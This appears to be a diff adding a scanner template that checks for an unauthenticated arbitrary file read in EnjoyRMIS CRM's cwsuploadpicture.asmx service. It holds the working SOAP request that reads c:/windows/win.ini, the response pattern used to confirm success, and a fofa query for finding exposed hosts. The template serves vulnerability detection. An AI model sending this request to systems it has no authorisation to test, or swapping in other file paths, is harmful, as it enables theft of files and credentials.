@@ -1,0 +1,34 @@
+id: enjoycrm-cwsuploadpicture-fileread
+info:
+  name: EnjoyRMIS CRM cwsuploadpicture.asmx Arbitrary File Read
+  author: ZacharyZcR
+  severity: high
+  verified: true
+  description: |-
+    EnjoyRMIS CRM system has a file read vulnerability in cwsuploadpicture.asmx interface.
+    Unauthenticated attackers can read arbitrary system files through this vulnerability.
+    fofa: body="/ClientBin/slEnjoy.App.xap"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%82%E6%8D%B7ERP/%E6%98%82%E6%8D%B7CRM%E7%B3%BB%E7%BB%9Fcwsuploadpicture.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: enjoycrm,lfi,fileread
+  created: 2024/12/30
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx
+      headers:
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetPicture"
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetPicture xmlns="http://tempuri.org/">
+              <sFullFileName>c:/windows/win.ini</sFullFileName>
+            </GetPicture>
+          </soap:Body>
+        </soap:Envelope>
+    expression: response.status == 200 && response.body.bcontains(b'OyBmb3IgMTYtYml0IGFwcC')
+expression: r0()
